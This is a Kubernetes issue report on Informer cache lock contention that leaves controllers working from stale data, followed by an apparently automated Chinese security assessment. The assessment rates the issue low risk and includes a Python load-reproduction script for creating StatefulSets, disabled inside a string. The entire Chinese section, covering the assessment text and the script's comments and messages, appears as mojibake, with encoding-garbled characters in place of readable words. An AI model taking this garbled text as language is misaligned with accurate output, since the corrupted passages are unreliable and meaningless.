A high backlog in DeltaFIFO results in stale Informer cache data, affecting KCM controllers that rely on it for resource reconciliation. This can lead to incorrect decisions, such as unnecessary resource creation or unnecessary load to APIServer and etcd from KCM Controllers. More details of impact/analysis on Statefulset controller, DaemonSet Controller is provided later in the example section.




#### Code Flow :

1. Cache controller [processLoop](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L205-L216) pops from DeltaFIFO queue to [processDeltas](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L552-L584). 

2. As cache controller processes deltas, it [adds](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L571) or [updates](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L566) the store based on[ ADD/UPDATE etc events ](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L564) from DeltFIFO queue. 

3. For Add/Update operations to store,  it acquires lock [here](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L236-L242) to update the store.


4. Meanwhile controller, in the process of [listing pods](https://github.com/kubernetes/kubernetes/blob/d386d6880e57556f7fe19e65e89f60501aa0aa25/pkg/controller/statefulset/stateful_set.go#L314) , it acquires read lock on store [here](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L296-L310) while DeltaFIFO in the above is trying to update the store at the same time.

I believe [Delete in Store](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L244-L251) is also prone to this,  this code path was not exercised in the test.




#### Mutex pprof for KCM showing RW and Rlock on Cache/Store from CacheController Loop and StatetfulSet controller getPodsFromList 

![Image](https://github.com/user-attachments/assets/d3dff4d4-0e1f-41bd-8c24-bd852c565917)

<img width="1878" alt="Image" src="https://github.com/user-attachments/assets/6a6808d9-3d7e-49f0-957f-6b02368b8563" />

##### Impact/Analysis examples :

###### 1. Statefulset Controller 

 In statefulset controller case, if/when cache is stale and Pod phase status reflects[ nil](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/statefulset/stateful_set_utils.go#L470) in cache, even though kubelet has patched the pod to `Running` phase, Statefulset controller will keep trying to [create pods and get 409's  - conflict as it exists in etcd ](https://github.com/kubernetes/kubernetes/blob/7b6c56e5fb530c80e3510977a752be5ce6e23a27/pkg/controller/statefulset/stateful_set_control.go#L397) as this [condition](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/statefulset/stateful_set_control.go#L388) will evaluate to true


When I patched the KCM Statefulset controller, I can see that just `LISTING` pods from informer cache in statefulset controller when there are lots of pods in single namespace can take upto at peak  `~980 ms `, which creates a huge backlog in DeltaFIFO during this time.


In Statefulset controller, in the process of [listing pods](https://github.com/kubernetes/kubernetes/blob/d386d6880e57556f7fe19e65e89f60501aa0aa25/pkg/controller/statefulset/stateful_set.go#L314) , it acquires read lock on Store [here](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L296-L310) while DeltaFIFO in the above is trying to update the Store at the same time ( will cover on this more below)



![Image](https://github.com/user-attachments/assets/8904f4cf-140b-4b17-b750-b8c04ea7d8f1)



**Example of DeltaFIFO backlog** 

```
12 trace.go:236] Trace[410148869]: "DeltaFIFO Pop Process" ID:kube-system/kube-proxy-fv428,Depth:229809,Reason:slow event handlers blocking the queue ... (total time: 321ms):
```



###### 2. DeamonSet Controller :

In DS conttoller it does similar thing , [listing all pods from cache](https://github.com/kubernetes/kubernetes/blob/6d0ac8c561a7ac66c21e4ee7bd1976c2ecedbf32/pkg/controller/daemon/daemon_controller.go#L702)  holding a read lock,  which blocks all that time from updating the store in Process Deltas.

Consequence of stale cache can make DS controller to create more DS pods for same node.








#### What did you expect to happen?

Ideally Controllers should be isolated from each other to avoid noisy neighbor problem, which isn't possible due to Controllers sharing Shared InformerCache.

**Long Term**:

Food for thought: 

- Introduce a dedicated Indexer/Cache solely for DeltaFIFO writes and syncing it  in a separate routine  to a separate Indexer/Store for controllers to read from can reduce lock contention from list from downstream controllers.
- However, this means controllers will operate on slightly delayed data, which is much better than super stale data at scale, we need to ensure this copy is light weight unlike Huge lists that controllers do today which worsens the contention. This will help APIMachinery code has more control on these components performance instead of depending on implementations of downstream controllers.

-  Main thing about this theory is that - we need to ensure we are not shifting the problem to second cache to reduce overhead in first cache :)  , we can something similar to what etcd does today, if difference between applies and commits b/w first cache and second cache is like say `X` , we will stop read lock to second cache from controller, to ensure second cache (i.e controller relies on) catches up to first cache, to guarantee controllers are not reading stale data  

- This comes with a con of increasing the memory overhead  because its essentially storing a separate cache copy.

This requires changing pieces of API Machinery architecture as it stands now.

This approach might not only help KCM controllers but any controllers relying on caches built out of API Machinery code that runs on Dataplane Nodes.


**At the minimum in short term**:

-  we should ensure all Controllers under KCM avoid heavy list operations on the Informer Cache/Store to reduce lock contention.

- Build and utilize Indexers where applicable to minimize the number of items fetched, reducing read lock duration and improving cache update efficiency.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create 200 Statefulsets of 1000 pods each at once.
- Ensure all those pods are Schedulable to the nodes.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

dev-dsk-hakuna-2c-2122d141 % kubectl version 
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

CVSS 3.1 è¯„åˆ†ä¼°ç®—ï¼ˆä»…ä¾›å‚è€ƒï¼Œå› ä¸ºä¸»è¦ä¸æ˜¯å®‰å…¨æ¼æ´ï¼‰ï¼š
*   AV:N (ç½‘ç»œè®¿é—®)
*   AC:H (æ”»å‡»å¤æ‚åº¦é«˜ï¼Œéœ€è¦ç‰¹å®šé«˜è´Ÿè½½æ¡ä»¶å’Œé«˜æƒé™)
*   PR:H (éœ€è¦é«˜æƒé™æ¥åˆ›å»ºå¤§é‡èµ„æº)
*   UI:N (æ— éœ€ç”¨æˆ·äº¤äº’)
*   S:U (å½±å“èŒƒå›´é™äºç³»ç»Ÿæœ¬èº«ï¼Œä¸æ”¹å˜å®‰å…¨åŸŸ)
*   C:N (æ— æœºå¯†æ€§å½±å“)
*   I:L (ä½å®Œæ•´æ€§å½±å“ï¼Œæ§åˆ¶å™¨å¯èƒ½åšå‡ºé”™è¯¯å†³ç­–å¯¼è‡´çŠ¶æ€æš‚æ—¶ä¸ä¸€è‡´)
*   A:L (ä½å¯ç”¨æ€§å½±å“ï¼Œæ§åˆ¶å™¨æ€§èƒ½ä¸‹é™ï¼ŒAPI Serverè´Ÿè½½å¢åŠ ï¼Œä½†ä¸å¤ªå¯èƒ½å¯¼è‡´å®Œå…¨ç˜«ç—ª)

ç»¼åˆå¾—åˆ†è¾ƒä½ï¼Œç¬¦åˆä½é£é™©è¯„çº§ã€‚

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°:** Issueæè¿°äº†Kubernetes Controller Manager (KCM) åœ¨é«˜è´Ÿè½½æƒ…å†µä¸‹ï¼Œç”±äºInformer Cacheçš„è¯»å†™é”ï¼ˆRW Lockï¼‰äº‰ç”¨ï¼Œå¯¼è‡´DeltaFIFOé˜Ÿåˆ—ç§¯å‹å’Œç¼“å­˜æ•°æ®è¿‡æ—¶ï¼ˆstaleï¼‰çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå¤šä¸ªControllerï¼ˆå¦‚StatefulSet Controller, DaemonSet Controllerï¼‰é¢‘ç¹åœ°å¯¹Informer Cacheæ‰§è¡Œè¯»æ“ä½œï¼ˆList Objectsï¼‰ï¼Œè¿™ä¼šé˜»æ­¢å¤„ç†DeltaFIFOæ›´æ–°äº‹ä»¶çš„å†™æ“ä½œè·å–é”ï¼Œä»è€Œå¯¼è‡´ç¼“å­˜æ›´æ–°å»¶è¿Ÿã€‚
2.  **å½±å“:** ç¼“å­˜æ•°æ®è¿‡æ—¶ä¼šä½¿ä¾èµ–è¿™äº›æ•°æ®çš„Controlleråšå‡ºé”™è¯¯çš„å†³ç­–ã€‚ä¾‹å¦‚ï¼š
    *   StatefulSet Controllerå¯èƒ½å› ä¸ºæœªèƒ½åŠæ—¶çœ‹åˆ°PodçŠ¶æ€æ›´æ–°ä¸º`Running`è€Œé”™è¯¯åœ°å°è¯•é‡å¤åˆ›å»ºå·²å­˜åœ¨çš„Podï¼Œå¯¼è‡´API Serveræ”¶åˆ°å¤§é‡å†²çªï¼ˆ409ï¼‰é”™è¯¯ï¼Œå¢åŠ äº†API Serverå’Œetcdçš„è´Ÿè½½ã€‚
    *   DaemonSet Controllerå¯èƒ½å› ä¸ºç¼“å­˜è¿‡æ—¶è€Œä¸ºåŒä¸€ä¸ªèŠ‚ç‚¹åˆ›å»ºå¤šä½™çš„Podã€‚
    *   æ€»ä½“å½±å“æ˜¯é™ä½äº†æ§åˆ¶å¾ªç¯çš„æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼Œå¢åŠ äº†ç³»ç»Ÿè´Ÿè½½ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤çŠ¶æ€ä¸é¢„æœŸä¸ç¬¦ã€‚
3.  **é—®é¢˜æ ¹æº:** è¿™æ˜¯`client-go`åº“ä¸­`SharedInformer`å’Œ`ThreadSafeStore`å®ç°çš„å›ºæœ‰æ€§èƒ½ç“¶é¢ˆã€‚åœ¨é«˜å¯¹è±¡æ•°é‡å’Œé«˜æ›´æ–°é¢‘ç‡ä¸‹ï¼Œè¯»æ“ä½œï¼ˆListï¼‰å’Œå†™æ“ä½œï¼ˆUpdate/Add/Delete from DeltaFIFOï¼‰ä¹‹é—´çš„é”äº‰ç”¨å˜å¾—æ˜æ˜¾ã€‚
4.  **å¤ç°æ¡ä»¶:** éœ€è¦åœ¨ä¸€ä¸ªæœ‰å¤§é‡å¯¹è±¡ï¼ˆç‰¹åˆ«æ˜¯Podï¼‰çš„é›†ç¾¤ä¸­ï¼Œé€šè¿‡åˆ›å»ºå¤§é‡èµ„æºï¼ˆå¦‚200ä¸ªStatefulSetï¼Œæ¯ä¸ª1000ä¸ªPodï¼‰æ¥æ¨¡æ‹Ÿé«˜è´Ÿè½½åœºæ™¯ã€‚
5.  **å®‰å…¨é£é™©è¯„ä¼°:**
    *   è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª**æ€§èƒ½é—®é¢˜**å’Œ**å¯ç”¨æ€§é—®é¢˜**ï¼Œå®ƒå½±å“äº†æ§åˆ¶å™¨çš„æ­£å¸¸è¿ä½œå’Œé›†ç¾¤çš„ç¨³å®šæ€§ï¼Œå°¤å…¶æ˜¯åœ¨å¤§è§„æ¨¡é›†ç¾¤ä¸­ã€‚
    *   å®ƒå¯èƒ½å¯¼è‡´**æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**çš„æ•ˆæœï¼Œä¸»è¦ä½“ç°åœ¨å¯¹API Serverå’Œetcdçš„è´Ÿè½½å¢åŠ ï¼ˆç”±äºæ§åˆ¶å™¨é”™è¯¯çš„é‡è¯•æ“ä½œï¼‰ï¼Œä»¥åŠæ§åˆ¶å™¨åŠŸèƒ½å¤±è°ƒï¼ˆæ— æ³•åŠæ—¶å‡†ç¡®åœ°å“åº”é›†ç¾¤çŠ¶æ€å˜åŒ–ï¼‰ã€‚
    *   è¦è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œæ”»å‡»è€…ï¼ˆæˆ–ç”¨æˆ·ï¼‰éœ€è¦æœ‰åœ¨é›†ç¾¤ä¸­**åˆ›å»ºå¤§é‡èµ„æº**ï¼ˆå¦‚StatefulSetsã€Podsï¼‰çš„æƒé™ã€‚è¿™é€šå¸¸éœ€è¦ç›¸å½“é«˜çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œ`create statefulsets`, `create pods`ç­‰ï¼‰ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #5ï¼Œå¦‚æœæ‹’ç»æœåŠ¡æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚è§¦å‘æ­¤é—®é¢˜éœ€è¦åˆ›å»ºå¤§é‡èµ„æºçš„æƒé™ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #7ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰å…¸å‹çš„é«˜é£é™©æ¼æ´ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #8ï¼Œè™½ç„¶ä¸€ä¸ªç”¨æˆ·ï¼ˆå¦‚æœæƒé™è¶³å¤Ÿé«˜ï¼‰çš„è¡Œä¸ºï¼ˆåˆ›å»ºå¤§é‡èµ„æºï¼‰å¯èƒ½å½±å“åˆ°æ•´ä¸ªKCMçš„æ€§èƒ½ï¼Œè¿›è€Œé—´æ¥å½±å“å…¶ä»–ç”¨æˆ·çš„æ§åˆ¶å™¨ï¼Œä½†è¿™æ›´åƒæ˜¯èµ„æºæ»¥ç”¨æˆ–ç³»ç»Ÿæ‰©å±•æ€§é—®é¢˜ï¼Œè€Œä¸æ˜¯å…¸å‹çš„è·¨ç§Ÿæˆ·å®‰å…¨æ”»å‡»ã€‚å½±å“æ˜¯é—´æ¥çš„ï¼Œé€šè¿‡äº‰æŠ¢å…±äº«èµ„æºï¼ˆKCM Informeré”ï¼‰å®ç°çš„ã€‚

    **ç»“è®º:** è¯¥é—®é¢˜ä¸»è¦å½±å“ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œæ€§èƒ½ï¼Œå¯¼è‡´æ§åˆ¶å™¨è¡Œä¸ºå¼‚å¸¸å’ŒAPI Serverè´Ÿè½½å¢åŠ ã€‚è§¦å‘æ¡ä»¶éœ€è¦è¾ƒé«˜çš„åˆ›å»ºæƒé™ã€‚è™½ç„¶åœ¨é«˜è´Ÿè½½ä¸‹å½±å“å¯èƒ½å¾ˆå¤§ï¼Œä½†å®ƒä¸ç¬¦åˆå…¸å‹çš„é«˜é£é™©æ¼æ´å®šä¹‰ï¼ˆå¦‚RCEã€ææƒï¼‰ï¼Œå¹¶ä¸”éœ€è¦éåªè¯»æƒé™æ¥è§¦å‘ç±»ä¼¼DoSçš„æ•ˆæœã€‚å› æ­¤ï¼Œåº”å°†å…¶è¯„çº§ä¸º**ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueè¢«è¯„çº§ä¸ºä½é£é™©ï¼ŒæŒ‰ç…§è¦æ±‚ä¸æä¾›é«˜é£é™©é—®é¢˜çš„å¤ç°è„šæœ¬ã€‚
# ä»¥ä¸‹ä¸ºæ³¨é‡Šæ‰çš„ç¤ºä¾‹æ€§ä»£ç æ¡†æ¶ï¼Œè¯´æ˜å¦‚ä½•æ¨¡æ‹Ÿè§¦å‘æ¡ä»¶ï¼Œä½†å¹¶éå®é™…å¯è¿è¡Œçš„POCã€‚
# è¯·æ³¨æ„ï¼šæ‰§è¡Œæ­¤ç±»è„šæœ¬å¯èƒ½å¯¹ç›®æ ‡Kubernetesé›†ç¾¤é€ æˆæ˜¾è‘—è´Ÿè½½ï¼Œè¯·ä»…åœ¨æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚

"""
import time
import sys
import threading
import signal
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# --- é…ç½®å‚æ•° ---
# è­¦å‘Šï¼šä»¥ä¸‹å‚æ•°å€¼éå¸¸å¤§ï¼Œæ˜¯æ ¹æ®Issueæè¿°æ¨¡æ‹Ÿçš„ï¼Œå®é™…æ‰§è¡Œå¯èƒ½éœ€è¦éå¸¸åºå¤§çš„é›†ç¾¤å’Œå¾ˆé•¿æ—¶é—´ã€‚
# åœ¨å®é™…æµ‹è¯•ä¸­åº”å¤§å¹…å‡å°è¿™äº›å€¼ã€‚
NUM_STATEFULSETS = 5  # ç¤ºä¾‹å€¼ï¼Œè¿œå°äºIssueä¸­çš„200
REPLICAS_PER_SET = 10 # ç¤ºä¾‹å€¼ï¼Œè¿œå°äºIssueä¸­çš„1000
NAMESPACE = "informer-contention-test"
TIMEOUT_SECONDS = 120 # è„šæœ¬æ‰§è¡Œè¶…æ—¶æ—¶é—´

# --- è¶…æ—¶å¤„ç† ---
_exit_event = threading.Event()

def _signal_handler(signum, frame):
    print(f"æ¥æ”¶åˆ°ä¿¡å· {signum}, æ­£åœ¨å°è¯•ä¼˜é›…é€€å‡º...")
    _exit_event.set()

def _timeout_handler():
    print(f"è„šæœ¬æ‰§è¡Œè¶…è¿‡ {TIMEOUT_SECONDS} ç§’ï¼Œè§¦å‘è¶…æ—¶ï¼Œæ­£åœ¨å°è¯•ä¼˜é›…é€€å‡º...")
    _exit_event.set()

# --- Kubernetes æ“ä½œ ---
def create_namespace(api_instance):
    try:
        api_instance.read_namespace(name=NAMESPACE)
        print(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²å­˜åœ¨ã€‚")
    except ApiException as e:
        if e.status == 404:
            print(f"åˆ›å»ºå‘½åç©ºé—´ '{NAMESPACE}'...")
            namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
            api_instance.create_namespace(body=namespace_body)
            print(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²åˆ›å»ºã€‚")
        else:
            print(f"æ£€æŸ¥å‘½åç©ºé—´æ—¶å‡ºé”™: {e}")
            raise

def delete_namespace(api_instance):
    print(f"å°è¯•åˆ é™¤å‘½åç©ºé—´ '{NAMESPACE}'...")
    try:
        api_instance.delete_namespace(name=NAMESPACE, body=client.V1DeleteOptions())
        # ç­‰å¾…åˆ é™¤å®Œæˆå¯èƒ½éœ€è¦æ—¶é—´ï¼Œè¿™é‡Œç®€å•è§¦å‘åˆ é™¤
        print(f"å·²è§¦å‘åˆ é™¤å‘½åç©ºé—´ '{NAMESPACE}'ã€‚è¯·æ‰‹åŠ¨ç¡®è®¤æˆ–ç­‰å¾…åå°å®Œæˆã€‚")
    except ApiException as e:
        if e.status == 404:
            print(f"å‘½åç©ºé—´ '{NAMESPACE}' ä¸å­˜åœ¨æˆ–å·²è¢«åˆ é™¤ã€‚")
        else:
            print(f"åˆ é™¤å‘½åç©ºé—´ '{NAMESPACE}' æ—¶å‡ºé”™: {e}")
            # ä¸å†æŠ›å‡ºå¼‚å¸¸ï¼Œä»¥ä¾¿è„šæœ¬å¯ä»¥ç»§ç»­æ‰§è¡Œï¼ˆä¾‹å¦‚è¶…æ—¶é€€å‡ºï¼‰

def create_statefulset(apps_api, set_index):
    if _exit_event.is_set():
        print(f"é€€å‡ºä¿¡å·å·²è®¾ç½®ï¼Œè·³è¿‡åˆ›å»º StatefulSet {set_index}")
        return

    name = f"test-sts-{set_index}"
    body = client.V1StatefulSet(
        api_version="apps/v1",
        kind="StatefulSet",
        metadata=client.V1ObjectMeta(name=name, namespace=NAMESPACE),
        spec=client.V1StatefulSetSpec(
            replicas=REPLICAS_PER_SET,
            selector=client.V1LabelSelector(match_labels={"app": name}),
            service_name=name, # Service name is required for headless service
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"app": name}),
                spec=client.V1PodSpec(
                    containers=[
                        client.V1Container(
                            name="nginx",
                            image="nginx:alpine", # ä½¿ç”¨è½»é‡çº§é•œåƒ
                            ports=[client.V1ContainerPort(container_port=80)],
                            resources=client.V1ResourceRequirements(
                                requests={"cpu": "10m", "memory": "20Mi"}, # é™åˆ¶èµ„æºæ¶ˆè€—
                                limits={"cpu": "50m", "memory": "50Mi"}
                            )
                        )
                    ]
                )
            )
            # VolumeClaimTemplates (å¯é€‰ï¼Œå¦‚æœéœ€è¦PV)
            # volume_claim_templates=[...]
        )
    )
    try:
        print(f"åˆ›å»º StatefulSet '{name}' (å‰¯æœ¬æ•°: {REPLICAS_PER_SET})...")
        apps_api.create_namespaced_stateful_set(namespace=NAMESPACE, body=body)
        print(f"StatefulSet '{name}' åˆ›å»ºè¯·æ±‚å·²å‘é€ã€‚")
        # ä¸ç­‰å¾…åˆ›å»ºå®Œæˆï¼Œä»¥æ¨¡æ‹Ÿå¹¶å‘è¯·æ±‚
    except ApiException as e:
        print(f"åˆ›å»º StatefulSet '{name}' æ—¶å‡ºé”™: {e}")
    except Exception as e:
        print(f"åˆ›å»º StatefulSet '{name}' æ—¶å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")


def main():
    # è®¾ç½®ä¿¡å·å¤„ç†
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    # è®¾ç½®è¶…æ—¶è®¡æ—¶å™¨
    timer = threading.Timer(TIMEOUT_SECONDS, _timeout_handler)
    timer.start()

    # åŠ è½½ kubeconfig
    try:
        print("åŠ è½½ Kubernetes é…ç½®...")
        config.load_kube_config()
        print("é…ç½®åŠ è½½æˆåŠŸã€‚")
        core_v1_api = client.CoreV1Api()
        apps_v1_api = client.AppsV1Api()
    except Exception as e:
        print(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
        timer.cancel()
        sys.exit(1)

    try:
        # 1. åˆ›å»ºæµ‹è¯•å‘½åç©ºé—´
        print("æ­¥éª¤ 1: åˆ›å»ºæµ‹è¯•å‘½åç©ºé—´")
        create_namespace(core_v1_api)

        if _exit_event.is_set():
            print("å¯åŠ¨è¿‡ç¨‹ä¸­æ”¶åˆ°é€€å‡ºä¿¡å·ï¼Œç»ˆæ­¢æ‰§è¡Œã€‚")
            raise SystemExit("Exiting due to signal")

        # 2. å¹¶å‘åˆ›å»ºå¤§é‡ StatefulSets
        print(f"\næ­¥éª¤ 2: å°è¯•åˆ›å»º {NUM_STATEFULSETS} ä¸ª StatefulSetsï¼Œæ¯ä¸ª {REPLICAS_PER_SET} å‰¯æœ¬...")
        threads = []
        for i in range(NUM_STATEFULSETS):
            if _exit_event.is_set():
                print("åˆ›å»ºè¿‡ç¨‹ä¸­æ”¶åˆ°é€€å‡ºä¿¡å·ï¼Œåœæ­¢åˆ›å»ºæ–°èµ„æºã€‚")
                break
            # å¯ä»¥è€ƒè™‘ä½¿ç”¨çº¿ç¨‹æ± æ¥é™åˆ¶å¹¶å‘åº¦ï¼Œé¿å…ç¬é—´è¯·æ±‚è¿‡å¤š
            thread = threading.Thread(target=create_statefulset, args=(apps_v1_api, i))
            threads.append(thread)
            thread.start()
            time.sleep(0.1) # è½»å¾®é”™å¼€è¯·æ±‚ï¼Œé¿å…APIé€Ÿç‡é™åˆ¶

        # ç­‰å¾…åˆ›å»ºçº¿ç¨‹ï¼ˆæˆ–ç›´åˆ°è¶…æ—¶/ä¿¡å·ï¼‰
        start_wait = time.time()
        while any(t.is_alive() for t in threads) and not _exit_event.is_set():
             # æ£€æŸ¥æ˜¯å¦ä»åœ¨è¶…æ—¶é™åˆ¶å†…
            if time.time() - start_wait > (TIMEOUT_SECONDS - 10): # ç•™å‡ºä¸€äº›æ—¶é—´ç»™æ¸…ç†
                 print("æ¥è¿‘è¶…æ—¶ï¼Œå¯èƒ½æ— æ³•ç­‰å¾…æ‰€æœ‰åˆ›å»ºå®Œæˆã€‚")
                 break
            time.sleep(1)

        if not _exit_event.is_set():
             print("\næ­¥éª¤ 3: èµ„æºåˆ›å»ºï¼ˆæˆ–å°è¯•åˆ›å»ºï¼‰å®Œæˆã€‚è„šæœ¬å°†åœ¨çŸ­æš‚ç­‰å¾…åé€€å‡ºã€‚")
             # è¿™é‡Œå¯ä»¥æ·»åŠ è§‚å¯Ÿ KCM æŒ‡æ ‡æˆ–æ—¥å¿—çš„ä»£ç ï¼ˆå¦‚æœå¯èƒ½ï¼‰
             wait_seconds = 10
             print(f"ç­‰å¾… {wait_seconds} ç§’...")
             time.sleep(wait_seconds)

    except SystemExit as e:
         print(f"è„šæœ¬è¢«ä¸­æ–­: {e}")
    except Exception as e:
        print(f"æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # åœæ­¢è¶…æ—¶è®¡æ—¶å™¨
        timer.cancel()
        # 3. æ¸…ç†èµ„æº (å³ä½¿å‡ºé”™æˆ–è¶…æ—¶ä¹Ÿå°è¯•æ‰§è¡Œ)
        print("\næ­¥éª¤ 4: æ¸…ç†èµ„æº...")
        try:
            delete_namespace(core_v1_api)
        except Exception as cleanup_e:
            print(f"æ¸…ç†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {cleanup_e}")
        print("è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")

# main() # å–æ¶ˆæ³¨é‡Šä»¥è¿è¡Œï¼Œä½†è¯·ç¡®ä¿åœ¨åˆé€‚çš„æµ‹è¯•ç¯å¢ƒä¸­
print("è¯¥è„šæœ¬ä»…ä¸ºç¤ºä¾‹æ¡†æ¶ï¼Œç”¨äºè¯´æ˜å¦‚ä½•æ¨¡æ‹Ÿè§¦å‘æ¡ä»¶ã€‚å®é™…è¿è¡Œå·²è¢«æ³¨é‡Šæ‰ã€‚")
print("Issue è¢«è¯„çº§ä¸ºä½é£é™©ï¼Œæ— éœ€æä¾›å¯è¿è¡Œçš„POCã€‚")

"""
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨é«˜è´Ÿè½½ä¸‹Kubernetes KCMçš„æ€§èƒ½ç“¶é¢ˆé—®é¢˜ï¼Œå³Informerç¼“å­˜çš„è¯»å†™é”äº‰ç”¨å¯¼è‡´ç¼“å­˜æ›´æ–°å»¶è¿Ÿã€‚è¿™ä¼šå½±å“ä¾èµ–ç¼“å­˜æ•°æ®çš„æ§åˆ¶å™¨ï¼ˆå¦‚StatefulSetã€DaemonSetï¼‰çš„æ­£ç¡®æ€§å’Œæ•ˆç‡ï¼Œå¯èƒ½å¯¼è‡´å®ƒä»¬åšå‡ºé”™è¯¯å†³ç­–ï¼ˆä¾‹å¦‚ï¼Œé‡å¤åˆ›å»ºå·²å­˜åœ¨çš„èµ„æºï¼‰ï¼Œä»è€Œå¢åŠ API Serverçš„è´Ÿè½½ã€‚

æˆ‘ä»¬å°†æ­¤é—®é¢˜è¯„çº§ä¸º**ä½é£é™©**ï¼Œç†ç”±å¦‚ä¸‹ï¼š
1.  **æ ¹æœ¬åŸå› **ï¼šè¿™æ˜¯ä¸€ä¸ªæ€§èƒ½å’Œæ‰©å±•æ€§é—®é¢˜ï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ï¼Œå®ƒä¸ç›´æ¥å¯¼è‡´æœªæˆæƒè®¿é—®ã€æƒé™æå‡æˆ–ä»£ç æ‰§è¡Œã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šè§¦å‘æ­¤é—®é¢˜éœ€è¦æ¨¡æ‹Ÿé«˜è´Ÿè½½åœºæ™¯ï¼Œè¿™é€šå¸¸éœ€è¦ç”¨æˆ·æ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»ºå¤§é‡èµ„æºçš„æƒé™ï¼ˆå¦‚åˆ›å»ºæ•°ç™¾ä¸ªStatefulSetå’Œæ•°åä¸‡ä¸ªPodï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #5ï¼Œéœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚`create`ï¼‰æ‰èƒ½å®æ–½çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»é€šå¸¸ä¸è¢«è¯„ä¸ºé«˜é£é™©ã€‚
3.  **å½±å“**ï¼šä¸»è¦å½±å“æ˜¯å¯ç”¨æ€§ï¼ˆæ§åˆ¶å™¨æ€§èƒ½ä¸‹é™ã€è¡Œä¸ºå¼‚å¸¸ï¼‰å’Œå¯¹API Serverçš„æ½œåœ¨DoSï¼ˆç”±äºæ§åˆ¶å™¨é”™è¯¯é‡è¯•å¯¼è‡´è´Ÿè½½å¢åŠ ï¼‰ã€‚å®Œæ•´æ€§å½±å“è¾ƒä½ï¼ˆå¯èƒ½å¯¼è‡´æš‚æ—¶çš„çŠ¶æ€ä¸ä¸€è‡´ï¼‰ã€‚

